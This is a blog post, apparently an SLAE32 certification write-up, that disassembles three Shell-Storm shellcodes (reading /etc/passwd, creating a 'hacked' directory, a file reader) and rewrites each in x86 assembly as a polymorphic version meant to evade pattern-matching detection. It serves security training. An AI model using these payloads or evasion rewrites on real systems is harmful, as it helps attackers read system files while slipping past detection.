@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.
+If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.
+Why? the goal of that certification is to practice and learn how to solve each assignment by yourself."><meta property="og:title" content="Assignment N°6 - Polymorphism" />
+<meta property="og:description" content="Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.
+If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.
+Why? the goal of that certification is to practice and learn how to solve each assignment by yourself." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.phrozen.io/docs/infosec/linux/slae32/ex6-polymorphism/" />
+<meta property="article:published_time" content="2020-06-12T16:36:31+02:00" />
+<meta property="article:modified_time" content="2020-06-12T16:36:31+02:00" />
+<title>Assignment N°6 - Polymorphism | Phrozen</title>
+<link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.63abd10f627a7a06406140610b7ce76d028552de10d790fcb09f332349c39047.css" integrity="sha256-Y6vRD2J6egZAYUBhC3znbQKFUt4Q15D8sJ8zI0nDkEc=">
+<script defer src="/en.search.min.86e3cb1d1d29ddd8a3d2600962708437dcff21fc53cbdb40ba7f1f89e3ae2043.js" integrity="sha256-huPLHR0p3dij0mAJYnCEN9z/IfxTy9tAun8fieOuIEM="></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-159560668-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script src="https://kit.fontawesome.com/8da36c42cc.js" crossorigin="anonymous"></script>
+  
+</head>
+
+<body>
+  <input type="checkbox" class="hidden" id="menu-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      
+  <nav>
+<h2 class="book-brand">
+  <a href="/"><img src="/logo.svg" alt="Logo" /></a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="/docs/projects/" class="">Projects</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/projects/windows/" class="collapsed ">Windows</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="/docs/infosec/" class="">InfoSec</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/" class="collapsed ">Linux</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/" class="collapsed ">SLAE32</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex7-crypters/" class="">Assignment N°7 - Crypters (Delphi/ASM)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex6-polymorphism/" class="active">Assignment N°6 - Polymorphism</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex5-shellcode-analyzing/" class="">Assignment N°5 - Shellcode Analyzing / Dissecting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex4-encoder/" class="">Assignment N°4 - Encoder (NASM)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex3-egghunter/" class="">Assignment N°3 - Egg Hunter (C)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex2-reverseshell/" class="">Assignment N°2 - Reverse Shell (NASM)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex1-bindshell/" class="">Assignment N°1 - Bindshell (NASM)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/windows/" class="collapsed ">Windows</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="/docs/programming/" class="">Programming</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/programming/windows/" class="collapsed ">Windows</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/programming/general/" class="collapsed ">General</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="" target="_blank" rel="noopener"><strong>
+        Social Networks
+      </strong></a>
+  </li>
+  
+  <li>
+    <a href="https://www.linkedin.com/in/jlesueur/" target="_blank" rel="noopener"><i class='fa fa-linkedin'></i>
+        Linkedin
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://www.twitter.com/darkcodersc" target="_blank" rel="noopener"><i class='fa fa-twitter'></i>
+        Twitter
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/DarkCoderSc" target="_blank" rel="noopener"><i class='fa fa-github'></i>
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="" target="_blank" rel="noopener"><strong>
+        Other Stuff
+      </strong></a>
+  </li>
+  
+  <li>
+    <a href="/disclaimer/disclaimer" target="_blank" rel="noopener">
+        Legal
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script>
+
+
+ 
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Assignment N°6 - Polymorphism</strong>
+
+  <label for="toc-control">
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="assignment-goals">Assignment Goals</h1>
+<p><img src="/images/202005/slae32-banner.png" alt="SLAE32" /></p>
+<blockquote class="book-hint warning">
+  <p>This paper is part of the certification process following the <a href="https://www.pentesteracademy.com/course?id=3">SLAE32 course</a> (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.</p>
+<p>If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.</p>
+<p>Why? the goal of that certification is to practice and learn how to solve each assignment by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.</p>
+<p>Student ID: <strong>SLAE-1530</strong></p>
+
+</blockquote>
+
+<ul>
+<li>
+<p>Take up 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching.</p>
+</li>
+<li>
+<p>The polymorphic versions cannot be larger 150% of the existing shellcode.</p>
+</li>
+<li>
+<p>Bonus points for making it shorter in length than original.</p>
+</li>
+</ul>
+<h1 id="foreword">Foreword</h1>
+<p>On <a href="shell-storm.org">Shell-Storm</a>, you will not always find the original assembly code for shellcodes you choose. To solve this issue, we&rsquo;ve created a tiny Python script to convert a shellcode from its string form to raw format (stdout). We can easily pipe output result to <code>Ndisasm</code> and recover an assembly code very close to the original version.</p>
+<h2 id="converter-python3">Converter (Python3)</h2>
+<pre><code>#!/usr/bin/python3
+
+# Jean-Pierre LESUEUR (@DarkCoderSc)
+# www.phrozen.io
+# SLAE32
+
+import sys
+
+def bytestr_to_bytearr(data):
+	return list(bytearray.fromhex(data.replace(&quot;\\x&quot;, &quot; &quot;)))
+
+if (len(sys.argv) != 2):
+	print(&quot;Usage: shellcode_to_raw.py &lt;shellcode[Ex: \\xff\\x90\\x92...]&gt;&quot;)
+else:
+	sys.stdout.buffer.write(bytes(bytestr_to_bytearr(sys.argv[1])))
+</code></pre><h3 id="usage">Usage</h3>
+<p>local@user:$ <code>chmod +x shellcstr_to_raw.py</code></p>
+<p>local@user:$ <code>./shellcstr_to_raw.py &lt;shellcode_string&gt; | ndisasm -b32 -</code></p>
+<h1 id="shellcode-n1---read-passwd-file">Shellcode N°1 - Read Passwd File.</h1>
+<hr>
+<p>As first shellcode, we chose the following one : <a href="http://shell-storm.org/shellcode/files/shellcode-571.php"><code>/bin/cat /etc/passwd</code></a></p>
+<h2 id="retrieve-assembly-form">Retrieve Assembly Form</h2>
+<p>We will use our tiny python script to retrieve the assembly form of this shellcode.</p>
+<pre><code>local@user:$ ./shellcstr_to_raw.py &quot;\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80&quot; | ndisasm -b32 -
+</code></pre><h3 id="result">Result</h3>
+<pre><code>00000000  31C0              xor eax,eax
+00000002  99                cdq
+00000003  52                push edx
+00000004  682F636174        push dword 0x7461632f
+00000009  682F62696E        push dword 0x6e69622f
+0000000E  89E3              mov ebx,esp
+00000010  52                push edx
+00000011  6873737764        push dword 0x64777373
+00000016  682F2F7061        push dword 0x61702f2f
+0000001B  682F657463        push dword 0x6374652f
+00000020  89E1              mov ecx,esp
+00000022  B00B              mov al,0xb
+00000024  52                push edx
+00000025  51                push ecx
+00000026  53                push ebx
+00000027  89E1              mov ecx,esp
+00000029  CD80              int 0x80
+</code></pre><h2 id="shellcode-purpose">Shellcode Purpose</h2>
+<p>This shellcode is a basic <code>execve()</code> call to execute the following command : <code>/bin/sh -c &quot;cat /etc/passwd&quot;</code></p>
+<p>It uses the stack technique to store <code>execve()</code> parameters.</p>
+<p>Original Size is <strong>43</strong> Bytes.</p>
+<h2 id="polymorphic-version">Polymorphic Version</h2>
+<h3 id="biggest-changes">Biggest Changes</h3>
+<p>Instead of using stack for storing the <code>execve()</code> command, we will use the Jump Call Pop technique.</p>
+<p>We need to store two distinct strings for our <code>execve()</code> call. To do so, we will store our <code>execve()</code> payload in the same defined byte array separated by a random byte <code>0xff</code>.</p>
+<p>On run time, we will replaced the <code>0xff</code> delimiter by NULL characters to break the string in two slices (We want to keep target shellcode free from NULL characters).</p>
+<p>In addition of that we will use equivalent instructions to achieve the same original goal. For example instead of doing :</p>
+<pre><code>xor eax, eax
+xor edx, edx
+</code></pre><p>We will do</p>
+<pre><code>xor eax, eax
+mov edx, eax
+</code></pre><p>etc..</p>
+<h3 id="result-1">Result</h3>
+<pre><code>global _start
+
+_start:
+	jmp short _call
+
+_pop:
+	xor eax, eax             ; initialize eax register
+	mov edx, eax             ; initialize edx
+
+	pop ebx                  ; /bin/cat
+	
+	mov byte [ebx+0x8], al   ; update 0xff with NULL
+	mov byte [ebx+0x14], al  ; update 0xff with NULL
+
+	lea ecx, [ebx+0x9]       ; place ecx to /etc/passwd
+
+	; replace push instructions
+	push eax                 ; NULL (EOF Argv)
+	push ecx                 ; */etc/passwd
+	push ebx                 ; */bin/cat	   
+
+	mov ecx, esp             ; **/bin/cat
+
+	add al, 0xb              ; equal to mov al, 0xb. execve() syscall
+
+	int 0x80                 ; call syscall()
+_call:
+	call _pop
+
+	; /bin/cat /etc/passwd
+	spell: db 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x63, 0x61, 0x74, 0xff, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0xff
+</code></pre><p>New Size is <strong>51</strong> Bytes.</p>
+<h1 id="shellcode-n2---create-new-directory">Shellcode N°2 - Create new Directory.</h1>
+<hr>
+<p>For our second shellcode we will use <a href="http://shell-storm.org/shellcode/files/shellcode-542.php">mkdir() &amp;&amp; exit()</a> from shell-storm.org.</p>
+<h2 id="retrieve-assembly-form-1">Retrieve Assembly Form</h2>
+<p>Like for our first shellcode, we will use our tiny script to recover it original assembly code (as close as possible)</p>
+<pre><code>local@user:$ ./shellcstr_to_raw.py &quot;\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x23&quot; | ndisasm -b32 -
+</code></pre><h3 id="result-2">Result</h3>
+<pre><code>00000000  EB16              jmp short 0x18
+00000002  5E                pop esi
+00000003  31C0              xor eax,eax
+00000005  884606            mov [esi+0x6],al
+00000008  B027              mov al,0x27
+0000000A  8D1E              lea ebx,[esi]
+0000000C  66B9ED01          mov cx,0x1ed
+00000010  CD80              int 0x80
+00000012  B001              mov al,0x1
+00000014  31DB              xor ebx,ebx
+00000016  CD80              int 0x80
+00000018  E8E5FFFFFF        call 0x2
+0000001D  6861636B65        push dword 0x656b6361
+00000022  64                fs
+00000023  23                db 0x23
+</code></pre><h2 id="shellcode-purpose-1">Shellcode Purpose</h2>
+<p>This very small shellcode will create a new directory called <strong>hacked</strong> on current directory. It will use the <code>mkdir</code> syscall to achieve his goal.</p>
+<p>The <strong>hacked</strong> string is stored at the end of the shellcode using the Jump Call Pop technique (<code>6861636B6564</code>).</p>
+<p>When directory is created, it will exit gracefully with error code equal to zero.</p>
+<p>Original Size is <strong>36</strong> Bytes.</p>
+<h2 id="polymorphic-version-1">Polymorphic Version</h2>
+<h3 id="biggest-changes-1">Biggest Changes</h3>
+<p>This time, we will replace the Jump Call Pop technique by the stack method to store the directory name. Using stack instead of Jump Call Pop will save few bytes for our shellcode.</p>
+<p>Apart this change, we will also tweak assembly instructions to achieve same result but using different instructions combinations.</p>
+<h3 id="result-3">Result</h3>
+<pre><code>global _start
+
+_start:
+	xor eax, eax    ; initialize eax
+	cdq             ; initialize edx
+
+	push ax         ; 0 (NULL)
+	mov cx, 0x6465  ; &quot;de&quot;
+	push cx         ; could also be (push word 0x6465)
+	push 0x6b636168 ; &quot;kcah&quot;
+
+	mov al, 0x27    ; mkdir() syscall
+
+	mov ebx, esp    ; directory name
+	mov cx, 0x1ed   ; mode	
+
+	int 0x80        ; call syscall
+
+	sub al, 0x26    ; = 0x1, exit() syscall
+	mov bl, dl      ; exit code equal zero
+	int 0x80        ; call syscall
+</code></pre><p>New Size is <strong>32</strong> Bytes.</p>
+<h1 id="shellcode-n3---read-file-content">Shellcode N°3 - Read File Content.</h1>
+<hr>
+<p>For our last shellcode, we will choose a more complex one still from shell-storm titled <a href="http://shell-storm.org/shellcode/files/shellcode-73.php">File Reader</a></p>
+<h2 id="retrieve-assembly-form-2">Retrieve Assembly Form</h2>
+<p>Again, we will use our python script to recover the closest possible assembly instructions for our last shellcode.</p>
+<pre><code>local@user:$ ./shellcstr_to_raw.py &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff&quot; | ndisasm -b32 -
+</code></pre><h3 id="result-4">Result</h3>
+<pre><code>00000000  31C0              xor eax,eax
+00000002  31DB              xor ebx,ebx
+00000004  31C9              xor ecx,ecx
+00000006  31D2              xor edx,edx
+00000008  EB32              jmp short 0x3c
+0000000A  5B                pop ebx
+0000000B  B005              mov al,0x5
+0000000D  31C9              xor ecx,ecx
+0000000F  CD80              int 0x80
+00000011  89C6              mov esi,eax
+00000013  EB06              jmp short 0x1b
+00000015  B001              mov al,0x1
+00000017  31DB              xor ebx,ebx
+00000019  CD80              int 0x80
+0000001B  89F3              mov ebx,esi
+0000001D  B003              mov al,0x3
+0000001F  83EC01            sub esp,byte +0x1
+00000022  8D0C24            lea ecx,[esp]
+00000025  B201              mov dl,0x1
+00000027  CD80              int 0x80
+00000029  31DB              xor ebx,ebx
+0000002B  39C3              cmp ebx,eax
+0000002D  74E6              jz 0x15
+0000002F  B004              mov al,0x4
+00000031  B301              mov bl,0x1
+00000033  B201              mov dl,0x1
+00000035  CD80              int 0x80
+00000037  83C401            add esp,byte +0x1
+0000003A  EBDF              jmp short 0x1b
+0000003C  E8C9FFFFFF        call 0xa
+.string &quot;/etc/passwd&quot;
+</code></pre><h2 id="shellcode-purpose-2">Shellcode Purpose</h2>
+<p>The purpose of this shellcode is to read the content of any file and write back to stdout file descriptor.</p>
+<p>To do so it will smartly read desired file byte by byte until it fail for any reasons (most likely EOF).</p>
+<p>The desired file name must be appended at the end of the shellcode. The shellcode is using Jump Call Pop technique to store the file name.</p>
+<h2 id="polymorphic-version-2">Polymorphic Version</h2>
+<h3 id="biggest-changes-2">Biggest Changes</h3>
+<p>This time we wont switch between Jump Call Pop and Stack techniques for storing strings. We will scramble most instructions to achieve the same goal.</p>
+<p>The main objective of this polymorphic version was to:</p>
+<ol>
+<li>Reduce the size of the payload (not to his maximum tho, this is not our goal).</li>
+<li>Achieve the same result while altering most original instructions.</li>
+</ol>
+<p>While creating the polymorphic version, we kept in mind registry status at each steps, even through jump calls to create something more difficult to understand.</p>
+<p>One example and very efficient to evade some weak detection systems was to used the predictable return value of <code>write()</code> call, and use it value to reassign a new syscall number.</p>
+<h3 id="result-5">Result</h3>
+<pre><code>global _start
+
+_start:
+	xor ecx, ecx           ; initialize ecx
+	mul ecx                ; initialize eax, edx
+
+	jmp short _call        ; start Jump Call Pop
+_pop:
+	mov ebx, [esp]	       ; recover filename (equivalent to pop ebx)
+
+	add al, 0x6
+	dec al                 ; 0x5 open() syscall number
+
+	int 0x80               ; call syscall
+
+	xchg ebx, eax          ; assign file handle to ebx
+
+	mov esi, ebx           ; copy file handle to esi
+
+	xchg eax, ecx          ; exchange ecx and eax values (eax = 0)
+
+	mov ecx, esp           ; our *buffer
+
+	inc edx                ; read file byte by byte
+
+	inc eax                ; eax = 1           
+_read_chunk:
+	add al, 0x2            ; 0x3 read() syscall number	
+
+	int 0x80               ; call syscall
+
+	cmp eax, edx           ; check if eax is equal to edx
+
+	jne _exit              ; if not equal we've probably reached the EOF
+
+	add al, 0x3            ; 0x4 write() syscall number
+
+	mov ebx, edx           ; edx = 1 so ebx = 1 = stdout file descriptor number
+
+	int 0x80               ; call syscall
+
+	mov ebx, esi           ; restore opened file descriptor (handle)
+
+	jmp short _read_chunk  ; read next chunk	
+_exit:
+	mov al, dl             ; edx = 0x1 so eax = 0x1 = exit() syscall
+	dec edx                ; edx = 0
+	xchg ebx, edx          ; ebx = 0	
+
+	int 0x80               ; call syscall
+_call:
+	call _pop
+	; filename: db 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64
+</code></pre><p>New Size is <strong>53</strong> Bytes.</p>
+<h1 id="afterword">Afterword</h1>
+<p>You will find all codes on the following Github repository : <a href="https://github.com/DarkCoderSc/slae32-polymophism">https://github.com/DarkCoderSc/slae32-polymophism</a></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex justify-between">
+
+
+
+
+
+</div>
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "phrozen-1" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  </main>
+
+  
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
